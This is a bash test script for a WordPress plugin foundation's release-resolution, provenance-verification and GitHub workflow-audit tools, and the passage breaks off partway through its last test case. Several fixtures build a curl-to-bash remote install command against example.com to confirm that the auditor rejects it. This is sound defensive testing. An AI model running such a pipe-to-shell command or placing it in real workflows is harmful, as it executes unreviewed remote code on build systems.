#!/usr/bin/env bash

set -euo pipefail

ROOT_DIR="${1:?Usage: $0 <root-dir>}"

audit_fixture=""
zip_fixture=""
forbidden_fixture=""
authorization_fixture=""
deploy_protection_fixture=""
deploy_local_project_fixture=""
plugin_check_release_fixture=""
plugin_check_resolve_output=""
external_dependency_pr_body=""
foundation_release_fixture=""
foundation_resolve_output=""
foundation_verify_fixture=""
foundation_verify_output=""
foundation_verify_verify_script=""
foundation_verify_release_json=""
foundation_verify_tag_ref_json=""
foundation_verify_compare_json=""
foundation_verify_pulls_json=""
foundation_verify_metadata_json=""
foundation_verify_sigstore_json=""
release_branch_source_fixture=""
release_branch_source_output=""
pr_stage_fixture=""
pr_stage_origin=""
pr_stage_output=""
pr_stage_helper_dir=""
release_publish_fixture=""
release_publish_output=""
wordpress_org_deploy_fixture=""

trap 'rm -rf "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$external_dependency_pr_body" "$foundation_release_fixture" "$foundation_resolve_output" "$foundation_verify_fixture" "$foundation_verify_output" "$foundation_verify_verify_script" "$foundation_verify_release_json" "$foundation_verify_tag_ref_json" "$foundation_verify_compare_json" "$foundation_verify_pulls_json" "$foundation_verify_metadata_json" "$foundation_verify_sigstore_json" "$release_branch_source_fixture" "$release_branch_source_output" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output" "$pr_stage_helper_dir" "$release_publish_fixture" "$release_publish_output" "$wordpress_org_deploy_fixture"' EXIT

plugin_check_release_fixture="$(mktemp)"
cat > "$plugin_check_release_fixture" <<'EOF'
[
  {
    "tag_name": "1.9.0",
    "published_at": "2025-01-01T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "1.9.1",
    "published_at": "2025-01-02T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "1.10.0",
    "published_at": "2025-01-08T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "2.0.0",
    "published_at": "2025-01-09T00:00:00Z",
    "author": { "login": "davidperezgar" },
    "draft": false,
    "prerelease": false
  }
]
EOF

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=true' "$plugin_check_resolve_output"
grep -Fxq 'version=1.10.0' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.10.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="someone-else" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_MIN_RELEASE_AGE_DAYS="7" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_NOW_EPOCH="1736208000" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=false' "$plugin_check_resolve_output"
grep -Fxq 'version=' "$plugin_check_resolve_output"

plugin_check_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_PLUGIN_CHECK_ALLOWED_RELEASE_AUTHORS="davidperezgar" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_MIN_RELEASE_AGE_DAYS="7" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_NOW_EPOCH="1736985600" \
  WP_PLUGIN_BASE_PLUGIN_CHECK_RELEASES_JSON="$plugin_check_release_fixture" \
  bash "$ROOT_DIR/scripts/update/resolve_latest_plugin_check_version.sh" "1.9.0" "WordPress/plugin-check" "$plugin_check_resolve_output"
grep -Fxq 'update_needed=true' "$plugin_check_resolve_output"
grep -Fxq 'version=1.10.0' "$plugin_check_resolve_output"

external_dependency_pr_body="$(mktemp)"
WP_PLUGIN_BASE_DEPENDENCY_NAME="plugin-check" \
  WP_PLUGIN_BASE_DEPENDENCY_SOURCE_REPOSITORY="WordPress/plugin-check" \
  WP_PLUGIN_BASE_DEPENDENCY_CURRENT_VERSION="1.9.0" \
  WP_PLUGIN_BASE_DEPENDENCY_TARGET_VERSION="1.10.0" \
  WP_PLUGIN_BASE_DEPENDENCY_PURPOSE="used by WordPress readiness validation" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_MODE="metadata-only" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_CHECKS=$'selected from published, non-draft, non-prerelease releases\nrelease author matched the reviewed allowlist' \
  bash "$ROOT_DIR/scripts/update/write_external_github_dependency_pr_body.sh" "$external_dependency_pr_body"
grep -Fq 'Reviewer warning:' "$external_dependency_pr_body"
grep -Fq 'review the upstream repository, tag, release notes, and release assets' "$external_dependency_pr_body"

external_dependency_pr_body="$(mktemp)"
WP_PLUGIN_BASE_DEPENDENCY_NAME="example-dependency" \
  WP_PLUGIN_BASE_DEPENDENCY_SOURCE_REPOSITORY="example/dependency" \
  WP_PLUGIN_BASE_DEPENDENCY_CURRENT_VERSION="2.0.0" \
  WP_PLUGIN_BASE_DEPENDENCY_TARGET_VERSION="2.1.0" \
  WP_PLUGIN_BASE_DEPENDENCY_PURPOSE="used by example validation" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_MODE="verified-provenance" \
  WP_PLUGIN_BASE_DEPENDENCY_TRUST_CHECKS=$'verified GitHub attestation\nvalidated signed release bundle' \
  bash "$ROOT_DIR/scripts/update/write_external_github_dependency_pr_body.sh" "$external_dependency_pr_body"
grep -Fq 'Trust level:' "$external_dependency_pr_body"
if grep -Fq 'Reviewer warning:' "$external_dependency_pr_body"; then
  echo "Verified external dependency PR body unexpectedly included a metadata-only reviewer warning." >&2
  exit 1
fi

foundation_release_fixture="$(mktemp)"
cat > "$foundation_release_fixture" <<'EOF'
[
  {
    "tag_name": "v1.2.2",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.3",
    "draft": true,
    "prerelease": false
  },
  {
    "tag_name": "v1.2.4",
    "draft": false,
    "prerelease": false
  },
  {
    "tag_name": "v2.0.0",
    "draft": false,
    "prerelease": false
  }
]
EOF

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.2" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=true' "$foundation_resolve_output"
grep -Fxq 'version=v1.2.4' "$foundation_resolve_output"
grep -Fxq 'v1.2.4' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d')
grep -Fxq 'v1.2.2' <(sed -n '/^candidates<<EOF$/,/^EOF$/p' "$foundation_resolve_output" | sed '1d;$d' | grep -v '^$' || true) && {
  echo "Foundation candidate list unexpectedly included the current version." >&2
  exit 1
}

foundation_resolve_output="$(mktemp)"
WP_PLUGIN_BASE_FOUNDATION_RELEASES_JSON="$foundation_release_fixture" bash "$ROOT_DIR/scripts/update/resolve_latest_foundation_version.sh" "v1.2.4" "MatthiasReinholz/wp-plugin-base" "$foundation_resolve_output"
grep -Fxq 'update_needed=false' "$foundation_resolve_output"
grep -Fxq 'version=' "$foundation_resolve_output"
grep -Fxq 'candidates=' "$foundation_resolve_output"

foundation_verify_fixture="$(mktemp -d)"
foundation_verify_release_json="$foundation_verify_fixture/release.json"
foundation_verify_tag_ref_json="$foundation_verify_fixture/tag-ref.json"
foundation_verify_compare_json="$foundation_verify_fixture/compare.json"
foundation_verify_pulls_json="$foundation_verify_fixture/pulls.json"
foundation_verify_metadata_json="$foundation_verify_fixture/dist-foundation-release.json"
foundation_verify_sigstore_json="$foundation_verify_fixture/dist-foundation-release.json.sigstore.json"
foundation_verify_verify_script="$foundation_verify_fixture/verify-sigstore.sh"

cat > "$foundation_verify_release_json" <<'EOF'
{
  "draft": false,
  "prerelease": false,
  "author": {
    "login": "github-actions[bot]"
  },
  "assets": [
    {
      "name": "dist-foundation-release.json",
      "url": "https://api.github.com/assets/metadata"
    },
    {
      "name": "dist-foundation-release.json.sigstore.json",
      "url": "https://api.github.com/assets/sigstore"
    }
  ]
}
EOF

cat > "$foundation_verify_tag_ref_json" <<'EOF'
{
  "object": {
    "type": "commit",
    "sha": "1111111111111111111111111111111111111111"
  }
}
EOF

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "behind"
}
EOF

cat > "$foundation_verify_pulls_json" <<'EOF'
[
  {
    "merged_at": "2026-04-09T10:00:00Z",
    "base": {
      "ref": "main"
    },
    "head": {
      "ref": "release/v1.2.3"
    },
    "merge_commit_sha": "1111111111111111111111111111111111111111"
  }
]
EOF

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

cat > "$foundation_verify_sigstore_json" <<'EOF'
{}
EOF

cat > "$foundation_verify_verify_script" <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
artifact_path="${2:-}"
bundle_path="${3:-}"
test -f "$artifact_path"
test -f "$bundle_path"
if [ "${WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL:-false}" = "true" ]; then
  echo "stub verifier failure" >&2
  exit 1
fi
EOF
chmod +x "$foundation_verify_verify_script"

foundation_verify_output="$(mktemp)"
GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" \
    "$foundation_verify_output"
grep -Fxq 'version=v1.2.3' "$foundation_verify_output"
grep -Fxq 'commit_sha=1111111111111111111111111111111111111111' "$foundation_verify_output"

cat > "$foundation_verify_release_json" <<'EOF'
{
  "draft": false,
  "prerelease": false,
  "author": {
    "login": "github-actions[bot]"
  },
  "assets": [
    {
      "name": "dist-foundation-release.json",
      "url": "https://api.github.com/assets/metadata"
    }
  ]
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a missing Sigstore asset." >&2
  exit 1
fi

cat > "$foundation_verify_release_json" <<'EOF'
{
  "draft": false,
  "prerelease": false,
  "author": {
    "login": "github-actions[bot]"
  },
  "assets": [
    {
      "name": "dist-foundation-release.json",
      "url": "https://api.github.com/assets/metadata"
    },
    {
      "name": "dist-foundation-release.json.sigstore.json",
      "url": "https://api.github.com/assets/sigstore"
    }
  ]
}
EOF

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "2222222222222222222222222222222222222222"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with mismatched metadata." >&2
  exit 1
fi

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with malformed metadata." >&2
  exit 1
fi

cat > "$foundation_verify_metadata_json" <<'EOF'
{
  "repository": "MatthiasReinholz/wp-plugin-base",
  "version": "v1.2.3",
  "commit": "1111111111111111111111111111111111111111"
}
EOF

if GH_TOKEN=dummy FOUNDATION_ALLOWED_RELEASE_AUTHORS='trusted-bot' \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a disallowed release author." >&2
  exit 1
fi

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "ahead"
}
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed for a commit outside main ancestry." >&2
  exit 1
fi

cat > "$foundation_verify_compare_json" <<'EOF'
{
  "status": "behind"
}
EOF

cat > "$foundation_verify_pulls_json" <<'EOF'
[]
EOF

if GH_TOKEN=dummy \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed without a matching release PR." >&2
  exit 1
fi

cat > "$foundation_verify_pulls_json" <<'EOF'
[
  {
    "merged_at": "2026-04-09T10:00:00Z",
    "base": {
      "ref": "main"
    },
    "head": {
      "ref": "release/v1.2.3"
    },
    "merge_commit_sha": "1111111111111111111111111111111111111111"
  }
]
EOF

if GH_TOKEN=dummy WP_PLUGIN_BASE_VERIFY_SIGSTORE_SHOULD_FAIL=true \
  WP_PLUGIN_BASE_FOUNDATION_RELEASE_JSON="$foundation_verify_release_json" \
  WP_PLUGIN_BASE_FOUNDATION_TAG_REF_JSON="$foundation_verify_tag_ref_json" \
  WP_PLUGIN_BASE_FOUNDATION_COMPARE_JSON="$foundation_verify_compare_json" \
  WP_PLUGIN_BASE_FOUNDATION_PULLS_JSON="$foundation_verify_pulls_json" \
  WP_PLUGIN_BASE_FOUNDATION_METADATA_ASSET="$foundation_verify_metadata_json" \
  WP_PLUGIN_BASE_FOUNDATION_SIGSTORE_ASSET="$foundation_verify_sigstore_json" \
  WP_PLUGIN_BASE_VERIFY_SIGSTORE_SCRIPT="$foundation_verify_verify_script" \
  bash "$ROOT_DIR/scripts/update/verify_foundation_release.sh" \
    "MatthiasReinholz/wp-plugin-base" \
    "v1.2.3" >/dev/null 2>&1; then
  echo "Foundation provenance verification unexpectedly passed with a failing Sigstore verifier." >&2
  exit 1
fi

audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an unpinned action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@153bb8e04406b158c6c84fc1615b65b24149a1fe
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a disallowed action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

remote_script_scheme='https'
remote_script_separator='://'
remote_script_target='example.com/install.sh'
remote_script_prefix="      - run: curl -fsSL ${remote_script_scheme}${remote_script_separator}${remote_script_target} | "
remote_script_shell='bash'
cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
${remote_script_prefix}${remote_script_shell}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a remote script pipe-to-shell payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: write-all
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for broad permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  escalate:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    permissions:
      contents: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for job-level permission escalation." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/release.yml" <<'EOF'
name: release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  pull-requests: read
  attestations: write
  id-token: write
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for an ungated pull_request_target workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/finalize-release.yml" <<'EOF'
name: finalize-release
on:
  pull_request_target:
    types:
      - closed
permissions:
  contents: write
  attestations: write
  id-token: write
jobs:
  release:
    if: >
      always() || (
        github.event.pull_request.merged == true &&
        github.event.pull_request.base.ref == 'main' &&
        github.event.pull_request.head.repo.full_name == github.repository &&
        (startsWith(github.event.pull_request.head.ref, 'release/') || startsWith(github.event.pull_request.head.ref, 'hotfix/'))
      )
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a broadened pull_request_target condition." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  id-token: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged id-token permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  pull-requests: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged pull-request permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
  attestations: write
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a custom workflow with privileged attestation permissions." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: !ruby/object:OpenStruct
  table:
    workflow_dispatch: true
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for unsafe YAML content." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"
composite_remote_script_scheme='https'
composite_remote_script_separator='://'
composite_remote_script_target='example.com/install.sh'
composite_remote_script_shell='ba''sh'
composite_remote_script_command="cur""l -fsSL ${composite_remote_script_scheme}${composite_remote_script_separator}${composite_remote_script_target} | ${composite_remote_script_shell}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<EOF
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: ${composite_remote_script_command}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action remote script payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: node20
  main: index.js
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a non-composite local action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: node index.js
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
